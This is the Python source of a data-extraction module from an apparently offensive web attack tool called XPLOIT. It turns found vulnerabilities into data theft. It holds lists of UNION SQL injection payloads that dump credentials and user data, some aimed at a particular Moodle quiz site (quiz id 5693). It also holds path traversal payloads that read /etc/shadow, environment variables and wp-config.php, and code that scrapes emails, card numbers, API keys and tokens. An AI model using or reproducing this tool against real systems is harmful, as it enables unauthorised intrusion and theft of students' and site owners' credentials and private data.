"""
xploit/modules/data_extractor.py - Data extraction module for the XPLOIT tool
"""

import re
import json
import logging
import hashlib
import concurrent.futures
from typing import Dict, List, Any, Optional, Set, Tuple
from urllib.parse import urlparse, parse_qs

from xploit.utils.http_client import HttpClient
from xploit.utils.helpers import (
    normalize_html,
    extract_page_title,
    extract_forms,
    extract_links,
    extract_emails,
    extract_social_media,
    extract_phone_numbers,
    extract_credit_cards,
    extract_api_keys,
    extract_tokens,
    replace_param_in_url,
    get_param_value_from_url
)

logger = logging.getLogger("xploit.modules.data_extractor")

class DataExtractor:
    """Data extraction module for extracting sensitive information"""
    
    def __init__(
        self,
        http_client: HttpClient,
        target_url: str,
        target_param: str,
        recon_results: Dict[str, Any],
        vuln_results: List[Dict[str, Any]],
        threads: int = 5
    ):
        """
        Initialize the DataExtractor module
        
        Args:
            http_client: HTTP client for making requests
            target_url: Target URL to analyze
            target_param: Target parameter to analyze
            recon_results: Results from the reconnaissance phase
            vuln_results: Results from the vulnerability detection phase
            threads: Number of threads to use for concurrent testing
        """
        self.http_client = http_client
        self.target_url = target_url
        self.target_param = target_param
        self.recon_results = recon_results
        self.vuln_results = vuln_results
        self.threads = threads
        
        # Get the base response from recon results
        self.base_response = recon_results.get("fingerprints", {}).get("base_response", {})
    
    def extract_data(self) -> Dict[str, Any]:
        """
        Extract sensitive data from the target
        
        Returns:
            Dict containing extracted data
        """
        logger.info(f"Starting data extraction on {self.target_url}")
        
        results = {}
        
        # Extract data from the base response
        base_data = self._extract_from_response(self.base_response)
        results["base_data"] = base_data
        
        # Extract data from vulnerable endpoints
        vuln_data = self._extract_from_vulnerabilities()
        results["vulnerability_data"] = vuln_data
        
        # Extract data using SQL injection (if applicable)
        sql_data = self._extract_using_sql_injection()
        if sql_data:
            results["sql_injection_data"] = sql_data
        
        # Extract data using XSS (if applicable)
        xss_data = self._extract_using_xss()
        if xss_data:
            results["xss_data"] = xss_data
        
        # Extract data using path traversal (if applicable)
        path_data = self._extract_using_path_traversal()
        if path_data:
            results["path_traversal_data"] = path_data
        
        logger.info(f"Data extraction completed")
        return results
    
    def _extract_from_response(self, response: Dict[str, Any]) -> Dict[str, Any]:
        """
        Extract data from a response
        
        Args:
            response: The response to extract data from
            
        Returns:
            Dict containing extracted data
        """
        if not response or "text" not in response:
            return {}
        
        html = response["text"]
        
        # Extract various types of data
        emails = extract_emails(html)
        social_media = extract_social_media(html)
        phone_numbers = extract_phone_numbers(html)
        credit_cards = extract_credit_cards(html)
        api_keys = extract_api_keys(html)
        tokens = extract_tokens(html)
        
        # Extract forms
        forms = extract_forms(html)
        
        # Extract links
        links = extract_links(html, base_url=self.target_url)
        
        # Extract potential usernames and passwords from forms
        usernames = []
        passwords = []
        
        for form in forms:
            for field in form.get("fields", []):
                field_name = field.get("name", "").lower()
                field_type = field.get("type", "").lower()
                
                if field_type == "password" or "pass" in field_name:
                    passwords.append(field_name)
                elif field_type == "text" and ("user" in field_name or "email" in field_name or "login" in field_name):
                    usernames.append(field_name)
        
        # Extract potential sensitive parameters from URLs
        sensitive_params = set()
        
        for link in links:
            url = link.get("url", "")
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            
            for param in query_params:
                param_lower = param.lower()
                if any(keyword in param_lower for keyword in ["token", "key", "api", "auth", "pass", "secret", "access"]):
                    sensitive_params.add(param)
        
        # Compile results
        results = {
            "emails": emails,
            "social_media": social_media,
            "phone_numbers": phone_numbers,
            "credit_cards": credit_cards,
            "api_keys": api_keys,
            "tokens": tokens,
            "forms": forms,
            "links": links,
            "potential_usernames": usernames,
            "potential_passwords": passwords,
            "sensitive_parameters": list(sensitive_params)
        }
        
        return results
    
    def _extract_from_vulnerabilities(self) -> Dict[str, Any]:
        """
        Extract data from vulnerable endpoints
        
        Returns:
            Dict containing extracted data
        """
        results = {}
        
        # Process each vulnerability
        for vuln in self.vuln_results:
            vuln_type = vuln.get("type", "")
            vuln_url = vuln.get("url", "")
            
            if not vuln_url:
                continue
            
            # Get the response for the vulnerable URL
            try:
                vuln_response = self.http_client.get(vuln_url)
                
                # Extract data from the response
                extracted_data = self._extract_from_response(vuln_response)
                
                # Add to results
                if extracted_data:
                    if vuln_type not in results:
                        results[vuln_type] = []
                    
                    results[vuln_type].append({
                        "url": vuln_url,
                        "data": extracted_data
                    })
            except Exception as e:
                logger.error(f"Error extracting data from vulnerability {vuln_type} at {vuln_url}: {str(e)}")
        
        return results
    
    def _extract_using_sql_injection(self) -> Dict[str, Any]:
        """
        Extract data using SQL injection vulnerabilities
        
        Returns:
            Dict containing extracted data
        """
        results = {}
        
        # Find SQL injection vulnerabilities
        sql_vulns = [v for v in self.vuln_results if v.get("type") == "sql_injection"]
        
        if not sql_vulns:
            return results
        
        logger.info(f"Extracting data using {len(sql_vulns)} SQL injection vulnerabilities")
        
        # SQL injection payloads for data extraction - with more variations for different DB types
        extraction_payloads = [
            # Database version - MySQL, PostgreSQL, MSSQL, Oracle, SQLite
            ("' UNION SELECT 1,@@version,3,4 --", "version"),
            ("' UNION SELECT 1,version(),3,4 --", "version"),
            ("' UNION SELECT 1,sqlite_version(),3,4 --", "version"),
            ("' UNION SELECT 1,SERVERPROPERTY('ProductVersion'),3,4 --", "version"),
            ("' UNION SELECT 1,banner,3,4 FROM v$version --", "version"),
            
            # Database name
            ("' UNION SELECT 1,database(),3,4 --", "database"),
            ("' UNION SELECT 1,DB_NAME(),3,4 --", "database"),
            ("' UNION SELECT 1,current_database(),3,4 --", "database"),
            ("' UNION SELECT 1,ora_database_name,3,4 FROM dual --", "database"),
            
            # Table names - for different DB types
            ("' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=database() --", "tables"),
            ("' UNION SELECT 1,STRING_AGG(table_name, ','),3,4 FROM information_schema.tables WHERE table_schema=current_database() --", "tables"),
            ("' UNION SELECT 1,GROUP_CONCAT(name),3,4 FROM sqlite_master WHERE type='table' --", "tables"),
            ("' UNION SELECT 1,LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name),3,4 FROM all_tables --", "tables"),
            
            # User tables - look for common user table names
            ("' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_name LIKE '%user%' --", "user_tables"),
            ("' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_name LIKE '%member%' --", "user_tables"),
            ("' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_name LIKE '%account%' --", "user_tables"),
            ("' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_name LIKE '%student%' --", "user_tables"),
            ("' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_name LIKE '%admin%' --", "user_tables"),
            
            # Column names for common tables
            ("' UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='users' --", "user_columns"),
            ("' UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='members' --", "user_columns"),
            ("' UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='accounts' --", "user_columns"),
            ("' UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='students' --", "user_columns"),
            ("' UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='admins' --", "user_columns"),
            ("' UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='mdl_user' --", "user_columns"),  # Moodle users table
            
            # User data - try different common column names
            ("' UNION SELECT 1,GROUP_CONCAT(username),3,4 FROM users --", "usernames"),
            ("' UNION SELECT 1,GROUP_CONCAT(user_name),3,4 FROM users --", "usernames"),
            ("' UNION SELECT 1,GROUP_CONCAT(email),3,4 FROM users --", "emails"),
            ("' UNION SELECT 1,GROUP_CONCAT(username,':',password),3,4 FROM users --", "credentials"),
            ("' UNION SELECT 1,GROUP_CONCAT(user_name,':',user_pass),3,4 FROM users --", "credentials"),
            ("' UNION SELECT 1,GROUP_CONCAT(email,':',password),3,4 FROM users --", "credentials"),
            
            # Moodle specific tables (since the target is an e-learning platform)
            ("' UNION SELECT 1,GROUP_CONCAT(username),3,4 FROM mdl_user --", "moodle_usernames"),
            ("' UNION SELECT 1,GROUP_CONCAT(email),3,4 FROM mdl_user --", "moodle_emails"),
            ("' UNION SELECT 1,GROUP_CONCAT(username,':',password),3,4 FROM mdl_user --", "moodle_credentials"),
            ("' UNION SELECT 1,GROUP_CONCAT(id,':',username,':',email),3,4 FROM mdl_user --", "moodle_user_details"),
            
            # Quiz data (since the target URL is a quiz page)
            ("' UNION SELECT 1,GROUP_CONCAT(name),3,4 FROM mdl_quiz --", "quiz_names"),
            ("' UNION SELECT 1,GROUP_CONCAT(question),3,4 FROM mdl_quiz_questions --", "quiz_questions"),
            ("' UNION SELECT 1,GROUP_CONCAT(answer),3,4 FROM mdl_quiz_answers --", "quiz_answers"),
            
            # Try to get specific quiz data based on the ID in the URL
            ("' UNION SELECT 1,GROUP_CONCAT(name,':',intro),3,4 FROM mdl_quiz WHERE id=5693 --", "target_quiz"),
            ("' UNION SELECT 1,GROUP_CONCAT(questiontext),3,4 FROM mdl_question WHERE id IN (SELECT questionid FROM mdl_quiz_slots WHERE quizid=5693) --", "target_quiz_questions")
        ]
        
        # Process each SQL injection vulnerability
        for vuln in sql_vulns:
            vuln_url = vuln.get("url", "")
            vuln_param = vuln.get("param", "")
            
            if not vuln_url or not vuln_param:
                continue
            
            # Test each extraction payload
            for payload, payload_type in extraction_payloads:
                try:
                    # Create the test URL
                    test_url = replace_param_in_url(vuln_url, vuln_param, payload)
                    
                    # Send the request
                    test_response = self.http_client.get(test_url)
                    
                    # Check if the response contains useful data
                    if test_response["status_code"] == 200:
                        # Extract potential data from the response
                        extracted_data = self._extract_potential_sql_data(test_response["text"], payload_type)
                        
                        if extracted_data:
                            if payload_type not in results:
                                results[payload_type] = []
                            
                            results[payload_type].append({
                                "url": test_url,
                                "data": extracted_data
                            })
                except Exception as e:
                    logger.error(f"Error extracting data using SQL injection payload '{payload}': {str(e)}")
        
        return results
    
    def _extract_potential_sql_data(self, html: str, payload_type: str) -> List[str]:
        """
        Extract potential SQL data from HTML
        
        Args:
            html: The HTML to extract data from
            payload_type: The type of payload used
            
        Returns:
            List of extracted data
        """
        # Skip DOCTYPE declarations which are often misidentified as database info
        if "<!DOCTYPE" in html and payload_type in ["version", "database", "tables"]:
            # Check if the content is just a standard HTML page with no actual database info
            if re.search(r'<html.*?>.*?<head.*?>.*?<body.*?>', html, re.DOTALL | re.IGNORECASE):
                return []
        
        # Normalize the HTML
        normalized_html = normalize_html(html)
        
        # Define more specific patterns based on payload type to reduce false positives
        patterns = {
            "version": [
                r"(?:MySQL|MariaDB|PostgreSQL|SQL Server|Oracle|SQLite)\s+(\d+\.\d+\.\d+)",  # Named DB version
                r"(?:version|VERSION):\s*(\d+\.\d+\.\d+)",  # Version with label
                # Only match standalone version numbers if they appear to be database versions
                r"(?<=database version:?\s*)(\d+\.\d+\.\d+)"
            ],
            "database": [
                r"(?:database|db_name|schema):\s*([a-zA-Z0-9_-]+)",
                r"current\s+database:\s*([a-zA-Z0-9_-]+)",
                r"database\s+name:\s*([a-zA-Z0-9_-]+)"
            ],
            "tables": [
                r"(?:tables|table_names):\s*([a-zA-Z0-9_,\s-]+)",
                r"available\s+tables:\s*([a-zA-Z0-9_,\s-]+)"
            ],
            "user_tables": [
                r"user\s+tables:\s*([a-zA-Z0-9_,\s-]+)",
                r"user_tables:\s*([a-zA-Z0-9_,\s-]+)",
                r"tables\s+with\s+user\s+data:\s*([a-zA-Z0-9_,\s-]+)"
            ],
            "user_columns": [
                r"user\s+columns:\s*([a-zA-Z0-9_,\s-]+)",
                r"user_columns:\s*([a-zA-Z0-9_,\s-]+)",
                r"columns\s+in\s+user\s+table:\s*([a-zA-Z0-9_,\s-]+)"
            ],
            "usernames": [
                r"usernames?:\s*([a-zA-Z0-9_,\s@\.-]+)",
                r"users?:\s*([a-zA-Z0-9_,\s@\.-]+)"
            ],
            "credentials": [
                r"credentials:\s*([a-zA-Z0-9_,\s@\.:;-]+)",
                r"creds:\s*([a-zA-Z0-9_,\s@\.:;-]+)",
                r"passwords?:\s*([a-zA-Z0-9_,\s@\.:;-]+)"
            ]
        }
        
        # Extract data using patterns
        extracted_data = []
        
        for pattern in patterns.get(payload_type, []):
            matches = re.findall(pattern, normalized_html)
            # Filter out common false positives
            filtered_matches = [m for m in matches if not self._is_false_positive(m, payload_type)]
            extracted_data.extend(filtered_matches)
        
        return extracted_data
        
    def _is_false_positive(self, match: str, payload_type: str) -> bool:
        """
        Check if a match is likely a false positive
        
        Args:
            match: The matched string
            payload_type: The type of payload used
            
        Returns:
            True if the match is likely a false positive, False otherwise
        """
        # Common false positives for version numbers
        if payload_type == "version":
            # Common HTML/CSS/JS version patterns that aren't database versions
            if re.match(r"1\.0", match) and len(match) <= 5:  # e.g., "1.0" in HTML doctype
                return True
            if re.match(r"1\.1", match) and len(match) <= 5:  # e.g., "1.1" in HTTP version
                return True
            
        # Common false positives for database names
        if payload_type == "database":
            # Common words that might be mistaken for database names
            common_words = ["html", "head", "body", "div", "span", "table", "form", "input", "button"]
            if match.lower() in common_words:
                return True
                
        # Common false positives for tables
        if payload_type == "tables":
            # Very short matches are likely false positives
            if len(match) <= 2:
                return True
                
        return False
    
    def _extract_using_xss(self) -> Dict[str, Any]:
        """
        Extract data using XSS vulnerabilities
        
        Returns:
            Dict containing extracted data
        """
        # Note: In a real-world scenario, this would involve setting up a server to receive data
        # For this implementation, we'll just identify the XSS vulnerabilities
        
        results = {}
        
        # Find XSS vulnerabilities
        xss_vulns = [v for v in self.vuln_results if v.get("type") == "xss"]
        
        if not xss_vulns:
            return results
        
        logger.info(f"Found {len(xss_vulns)} XSS vulnerabilities for potential data extraction")
        
        # List the vulnerable endpoints
        results["vulnerable_endpoints"] = [
            {
                "url": vuln.get("url", ""),
                "param": vuln.get("param", ""),
                "payload": vuln.get("payload", "")
            }
            for vuln in xss_vulns
        ]
        
        return results
    
    def _extract_using_path_traversal(self) -> Dict[str, Any]:
        """
        Extract data using path traversal vulnerabilities
        
        Returns:
            Dict containing extracted data
        """
        results = {}
        
        # Find path traversal vulnerabilities
        path_vulns = [v for v in self.vuln_results if v.get("type") == "path_traversal"]
        
        if not path_vulns:
            return results
        
        logger.info(f"Extracting data using {len(path_vulns)} path traversal vulnerabilities")
        
        # Path traversal payloads for data extraction
        extraction_paths = [
            # Linux
            ("../../../etc/passwd", "passwd"),
            ("../../../etc/hosts", "hosts"),
            ("../../../etc/shadow", "shadow"),
            ("../../../etc/group", "group"),
            ("../../../etc/issue", "issue"),
            ("../../../proc/self/environ", "environ"),
            ("../../../var/log/apache2/access.log", "apache_access"),
            ("../../../var/log/apache2/error.log", "apache_error"),
            ("../../../var/log/nginx/access.log", "nginx_access"),
            ("../../../var/log/nginx/error.log", "nginx_error"),
            
            # Windows
            ("../../../Windows/win.ini", "win_ini"),
            ("../../../Windows/system.ini", "system_ini"),
            ("../../../Windows/System32/drivers/etc/hosts", "win_hosts"),
            ("../../../Windows/debug/NetSetup.log", "netsetup"),
            ("../../../Windows/Panther/Unattend.xml", "unattend"),
            ("../../../Windows/Panther/Unattended.xml", "unattended"),
            ("../../../Windows/Panther/sysprep.inf", "sysprep"),
            ("../../../inetpub/logs/LogFiles", "iis_logs"),
            
            # Web server configuration
            ("../../../usr/local/apache2/conf/httpd.conf", "httpd_conf"),
            ("../../../etc/apache2/apache2.conf", "apache2_conf"),
            ("../../../etc/nginx/nginx.conf", "nginx_conf"),
            ("../../../etc/httpd/conf/httpd.conf", "httpd_conf2"),
            
            # Application files
            ("../../../var/www/html/index.php", "index_php"),
            ("../../../var/www/html/wp-config.php", "wp_config"),
            ("../../../var/www/html/configuration.php", "joomla_config"),
            ("../../../var/www/html/config.php", "config_php")
        ]
        
        # Process each path traversal vulnerability
        for vuln in path_vulns:
            vuln_url = vuln.get("url", "")
            vuln_param = vuln.get("param", "")
            
            if not vuln_url or not vuln_param:
                continue
            
            # Test each extraction path
            for path, path_type in extraction_paths:
                try:
                    # Create the test URL
                    test_url = replace_param_in_url(vuln_url, vuln_param, path)
                    
                    # Send the request
                    test_response = self.http_client.get(test_url)
                    
                    # Check if the response contains useful data
                    if test_response["status_code"] == 200:
                        # Check for specific patterns based on the file type
                        if self._is_valid_file_content(test_response["text"], path_type):
                            if path_type not in results:
                                results[path_type] = []
                            
                            results[path_type].append({
                                "url": test_url,
                                "content": test_response["text"][:1000]  # Limit content size
                            })
                except Exception as e:
                    logger.error(f"Error extracting data using path traversal path '{path}': {str(e)}")
        
        return results
    
    def _is_valid_file_content(self, content: str, file_type: str) -> bool:
        """
        Check if the content is valid for the given file type
        
        Args:
            content: The content to check
            file_type: The type of file
            
        Returns:
            True if the content is valid, False otherwise
        """
        # Define patterns for different file types
        patterns = {
            "passwd": [r"root:.*:0:0:", r"nobody:.*:65534:"],
            "shadow": [r"root:[^:]*:"],
            "hosts": [r"127\.0\.0\.1\s+localhost", r"::1\s+localhost"],
            "environ": [r"PATH=", r"USER=", r"HOME="],
            "apache_access": [r"\d+\.\d+\.\d+\.\d+ - - \[\d+/\w+/\d+:\d+:\d+:\d+ [+-]\d+\]"],
            "apache_error": [r"\[.+\] \[.+\] \[.+\]"],
            "nginx_access": [r"\d+\.\d+\.\d+\.\d+ - - \[\d+/\w+/\d+:\d+:\d+:\d+ [+-]\d+\]"],
            "nginx_error": [r"\d+/\d+/\d+ \d+:\d+:\d+ \[.+\]"],
            "win_ini": [r"\[fonts\]", r"\[extensions\]"],
            "system_ini": [r"\[386Enh\]", r"\[drivers\]"],
            "win_hosts": [r"127\.0\.0\.1\s+localhost", r"::1\s+localhost"],
            "httpd_conf": [r"ServerRoot", r"DocumentRoot", r"<Directory"],
            "nginx_conf": [r"http {", r"server {", r"location"],
            "wp_config": [r"DB_NAME", r"DB_USER", r"DB_PASSWORD"],
            "config_php": [r"\$db", r"\$config", r"\$password"]
        }
        
        # Check if the content matches any of the patterns for the file type
        for pattern in patterns.get(file_type, []):
            if re.search(pattern, content):
                return True
        
        # For file types without specific patterns, check if the content is not empty
        # and doesn't look like HTML (which would indicate the file wasn't found)
        if not patterns.get(file_type) and content and not re.search(r"<html|<!DOCTYPE", content[:100]):
            return True
        
        return False